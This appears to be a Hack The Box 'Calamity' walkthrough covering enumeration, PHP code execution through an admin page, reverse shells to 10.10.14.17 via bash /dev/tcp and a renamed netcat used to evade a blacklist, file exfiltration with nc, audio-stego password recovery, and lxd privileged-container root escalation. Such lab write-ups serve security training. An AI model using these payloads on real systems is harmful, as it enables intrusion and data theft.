Nmap scan

```
sudo nmap -sV -sC -oA nmap 10.10.10.27
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumarating HTTP

We have this website:

![image1](/assets/images/htb-calamity/calamity1.png)

I used gobuster to find hidden files and directories and I find this:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.27 -x txt,php -t 40
/uploads (Status: 301)
/admin.php (Status: 200)
```

`/uploads`:

![image2](/assets/images/htb-calamity/calamity2.png)

`/admin.php`:

![image3](/assets/images/htb-calamity/calamity3.png)

### Enumearting the admin page

I try to login, and I send the request to burp, and in the response there's the password

![image4](/assets/images/htb-calamity/calamity4.png)

After loggin in with this password I have this:

![image5](/assets/images/htb-calamity/calamity5.png)

We have and HTML intepreter

![image6](/assets/images/htb-calamity/calamity6.png)

We can use php too:

![image7](/assets/images/htb-calamity/calamity7.png)

![image8](/assets/images/htb-calamity/calamity8.png)

Next thing I'm going to try to ping back my machine back with:

```
<?php exec("/bin/bash -c 'ping -c 2 10.10.14.17'"); ?>
```

And I get the 2 pings back:

```
sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:26:30.151873 IP 10.10.10.27 > ubuntu: ICMP echo request, id 6199, seq 1, length 64
07:26:30.151898 IP ubuntu > 10.10.10.27: ICMP echo reply, id 6199, seq 1, length 64
07:26:31.144792 IP 10.10.10.27 > ubuntu: ICMP echo request, id 6199, seq 2, length 64
07:26:31.144818 IP ubuntu > 10.10.10.27: ICMP echo reply, id 6199, seq 2, length 64
```

After that I try to get a shell with: 

```
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.17/9001 0>&1'"); ?>
```

But it dies after getting it, next thing I try is to download files and put them on the `/uploads` directory:

```
<?php exec("/bin/bash -c 'curl http://10.10.14.17/rev.sh > uploads/rev.sh'"); ?>
```

I can't get a reverse shell so the next thing I'm going to do is start enumarating the box using burp and repeater

![image9](/assets/images/htb-calamity/calamity9.png)

Then I find the user `Xalvas` has a directory in `/home` that has a file called `intrusions`:

![image10](/assets/images/htb-calamity/calamity10.png)


### Getting a reverse shell

So our tryes to get a reverse shell are getting blacklisted, to bypass this blacklist we are going to copy nc to another path and change the name, and then we will do the typical nc reverse shell but with the new name:

First let's copy nc to another directory:

![image11](/assets/images/htb-calamity/calamity11.png)

Add permissions to execute:

![image12](/assets/images/htb-calamity/calamity12.png)

After that set up a listener and do the reverse shell with the new nc:

![image13](/assets/images/htb-calamity/calamity13.png)

And we have a shell:

```
nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.27 42740
/bin/sh: 0: can't access tty; job control turned off
$   
```

### Enumerating xalvas home directory

There's recov.wav

```
-rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
```

And in /home/xalvas/alarmclocks are more

```
-rw-r--r-- 1 root   root   3196668 Jun 27  2017 rick.wav                        │
-rw-r--r-- 1 root   root   2645839 Jun 27  2017 xouzouris.mp3
```

So i transfered this files to my machine because probably there's a stego technique used here

```
/dev/shm/re 10.10.14.17 9003 < recov.wav
nc -lvnp 9003 > recov.wav
```

```
/dev/shm/re 10.10.14.17 9003 < rick.wav
nc -lvnp 9003 > rick.wav
```

```
/dev/shm/re 10.10.14.17 9003 < xouzouris.mp3
nc -lvnp 9003 > xouzouris.mp3
```

Now i open it on audacity, import the recov.wav and rick.wav, then select effect-invert and there's a voice that will say things

![calamity](/assets/images/htb-calamity/calamity14.png)

The voice says some numbers and then the password is 185, so the password is 18547936..*

Now i'll ssh into xalvas user

```bash
ssh xalvas@10.10.10.27
```

And now the privesc

```bash
id
----131(lxd)----
```

lxd is for containers, and there's a vulnerability that we can use it to run as root

### Exploiting lxd container

I'll download alpine builder

```bash
git clone https://github.com/saghul/lxd-alpine-builder
```

```bash
sudo ./build-alpine -a i686
```

And now transfer it

```bash
scp alpine-v3.12-i686-20200911_0436.tar.gz xalvas@10.10.10.27:
```

Now let's do the process to get root user

```
mkdir privesc
cd privesc/
mv ../alpine-v3.12-i686-20200911_0436.tar.gz .
lxc image import alpine-v3.12-i686-20200911_0436.tar.gz --alias alpine
lxc image list
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
| alpine | c4d146e61042 | no     | alpine v3.12 (20200911_04:36) | i686 | 3.06MB | Sep 11, 2020 at 11:46am (UTC) |
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
lxc init alpine c3t -c security.privileged=true
lxc config device add c3t host-root disk source=/ path=/mnt/root/
lxc start c3t
lxc exec c3t /bin/sh
~ # cd /mnt/root/root
```






